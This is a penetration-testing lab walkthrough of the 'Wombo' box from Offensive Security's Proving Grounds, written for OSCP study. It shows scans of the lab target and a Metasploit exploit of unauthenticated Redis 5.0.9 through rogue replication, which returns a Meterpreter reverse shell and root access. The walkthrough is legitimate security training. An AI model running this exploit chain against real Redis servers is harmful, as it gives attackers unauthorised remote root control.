---
description: 'Date: 08/30/22'
---

# "Wombo" (Easy)

Walkthrough by: Jacob Swinsinski

“Wombo” from Offensive Security’s Proving Ground Practice — “Easy” Difficulty

Target: 192.168.78.69

### Recon:

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:80:39:ef:3f:61:a8:d9:e6:fb:04:94:23:c9:ef:a8 (RSA)
|   256 83:f8:6f:50:7a:62:05:aa:15:44:10:f5:4a:c2:f5:a6 (ECDSA)
|_  256 1e:2b:13:30:5c:f1:31:15:b4:e8:f3:d2:c4:e8:05:b5 (ED25519)
80/tcp   open  http       nginx 1.10.3
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=NXzKMbuTduTE11wOsLywoDPD; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 11098
|     ETag: W/"2b5a-vzVQBA0qqtJbXdDpzWOYZftmDRc"
|     Vary: Accept-Encoding
|     Date: Wed, 24 Aug 2022 01:06:11 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Not Found | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_n
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=fzVhbNbXu0CGjzY4kOyif3SR; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 18181
|     ETag: W/"4705-XbawcOO3syzsRy5A7k+O/Q4miAE"
|     Vary: Accept-Encoding
|     Date: Wed, 24 Aug 2022 01:06:10 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Home | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_name" content
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Vary: Accept-Encoding
|     Date: Wed, 24 Aug 2022 01:06:10 GMT
|     Connection: close
|     GET,HEAD
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
| http-robots.txt: 3 disallowed entries 
|_/admin/ /reset/ /compose
|_http-title: Home | NodeBB
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Making a script scan on extra ports: 6379, 27017
                                                                                             
PORT      STATE SERVICE VERSION
6379/tcp  open  redis   Redis key-value store 5.0.9
27017/tcp open  mongodb MongoDB 4.0.18
| mongodb-info: 
|   MongoDB Build info
|     debug = false
|     javascriptEngine = mozjs
|     bits = 64
|     ok = 1.0
|     gitVersion = 6883bdfb8b8cff32176b1fd176df04da9165fd67
|     buildEnvironment
|       linkflags = -pthread -Wl,-z,now -rdynamic -Wl,--fatal-warnings -fstack-protector-strong -fuse-ld=gold -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro
|       cc = /opt/mongodbtoolchain/v2/bin/gcc: gcc (GCC) 5.4.0
|       cxxflags = -Woverloaded-virtual -Wno-maybe-uninitialized -std=c++14
|       ccflags = -fno-omit-frame-pointer -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -Werror -O2 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -fno-builtin-memcmp
|       target_os = linux
|       target_arch = x86_64
|       distarch = x86_64
|       distmod = debian92
|       cxx = /opt/mongodbtoolchain/v2/bin/g++: g++ (GCC) 5.4.0
|     openssl
|       running = OpenSSL 1.1.0l  10 Sep 2019
|       compiled = OpenSSL 1.1.0l  10 Sep 2019
|     allocator = tcmalloc
|     maxBsonObjectSize = 16777216
|     storageEngines
|       0 = devnull
|       1 = ephemeralForTest
|       2 = mmapv1
|       3 = wiredTiger
|     versionArray
|       0 = 4
|       1 = 0
|       2 = 18
|       3 = 0
|     modules
|     sysInfo = deprecated
|     version = 4.0.18
|   Server status
|     ok = 0.0
|     codeName = Unauthorized
|     errmsg = command serverStatus requires authentication
|_    code = 13
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Content-Type: text/plain
|     Content-Length: 85
|     looks like you are trying to access MongoDB over HTTP on the native driver port.
|   mongodb: 
|     errmsg
|     command serverStatus requires authentication
|     code
|     codeName
|_    Unauthorized
| mongodb-databases: 
|   ok = 0.0
|   codeName = Unauthorized
|   errmsg = command listDatabases requires authentication
|_  code = 13
```

#### Dirsearch Directory Bruteforce Enumeration:

```
dirsearch -u <http://192.168.78.69>              Mon 29 Aug 2022 11:28:31 PM EDT

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/../.dirsearch/reports/192.168.78.69/_22-08-29_23-28-50.txt

Error Log: /home/../.dirsearch/logs/errors-22-08-29_23-28-50.log

Target: <http://192.168.78.69/>

[23:28:50] Starting: 
                                                                             
Task Completed
```

* Nothing was found.

#### MongoDB Enumeration:

[27017,27018 - Pentesting MongoDB](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb)

```
mongo 192.168.78.69:27017

MongoDB shell version v5.3.1
connecting to: mongodb://192.168.78.69:27017/test?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("dffbb710-c073-4bb4-bc01-b02356db103c") }
MongoDB server version: 4.0.18
WARNING: shell and server versions do not match
================
Warning: the "mongo" shell has been superseded by "mongosh",
which delivers improved usability and compatibility.The "mongo" shell has been deprecated and will be removed in
an upcoming release.
For installation instructions, see
<https://docs.mongodb.com/mongodb-shell/install/>
```

* This looks like we might need to install additional tools in order for us to connect to the DB.
* This ended up being a rabbit hole

#### Searchsploit (Redis):

```
searchsploit redis 

----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Redis - Replication Code Execution (Metasploit)            | linux/remote/48272.rb
Redis 4.x / 5.x - Unauthenticated Code Execution (Metasplo | linux/remote/47195.rb
Redis 5.0 - Denial of Service                              | linux/dos/44908.txt
Redis-cli < 5.0 - Buffer Overflow (PoC)                    | linux/local/44904.py
----------------------------------------------------------- ----------------------------
```

* We see an exploit for Unauthenticated code execution for version 5.x
  * We are running 5.0.9 let’s try this
  * This is a best case scenario if we can get this to work!

#### Exploit Research:

* OpenSSH 7.4p1
* nginx 1.10.3
* Redis key-value store 5.0.9
* MongoDB 4.0.18

#### Exploiting Redis via Metasploit:

Starting Metasploit

```
msfconsole

search redis

use 7

msf6 exploit(linux/redis/redis_replication_cmd_exec) > show options

Module options (exploit/linux/redis/redis_replication_cmd_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CUSTOM    true             yes       Whether compile payload file during exploiting
   PASSWORD  foobared         no        Redis password for authentication test
   RHOSTS    192.168.78.69    yes       The target host(s), see <https://github.com/rapid7/m>
                                        etasploit-framework/wiki/Using-Metasploit
   RPORT     6379             yes       The target port (TCP)
   SRVHOST   192.168.49.78    yes       The local host or network interface to listen on. T
                                        his must be an address on the local machine or 0.0.
                                        0.0 to listen on all addresses.
   SRVPORT   6379             yes       The local port to listen on.

Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.49.78    yes       The listen address (an interface may be specified)
   LPORT  8080             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf6 exploit(linux/redis/redis_replication_cmd_exec) > exploit

[*] Started reverse TCP handler on 192.168.49.78:8080 
[*] 192.168.78.69:6379    - Compile redis module extension file
[+] 192.168.78.69:6379    - Payload generated successfully! 
[*] 192.168.78.69:6379    - Listening on 192.168.49.78:6379
[*] 192.168.78.69:6379    - Rogue server close...
[*] 192.168.78.69:6379    - Sending command to trigger payload.
[*] Sending stage (3020772 bytes) to 192.168.78.69
[+] 192.168.78.69:6379    - Deleted ./vwymsi.so
[*] Meterpreter session 1 opened (192.168.49.78:8080 -> 192.168.78.69:36764) at 2022-08-30 00:26:15 -0400

meterpreter > shell
Process 1233 created.
Channel 1 created.
whoami
root
```

#### Proof:

<figure><img src="../../../.gitbook/assets/Capture (1).PNG" alt=""><figcaption></figcaption></figure>

#### Lessons Learned:

*   When using **Searchsploit,** be sure to search for both the explicit service and version as well as just the service itself.

    * Example:

    ```
    searchsploit redis 5.0.9

    searchsploit redis 
    ```
* Read the output of nmap not once, not twice, but at LEAST three times over.
* Although we can only utilize Metasploit once during the OSCP exam, this was an easy win and it is something that I would be willing to accept if recognized during my attempt.
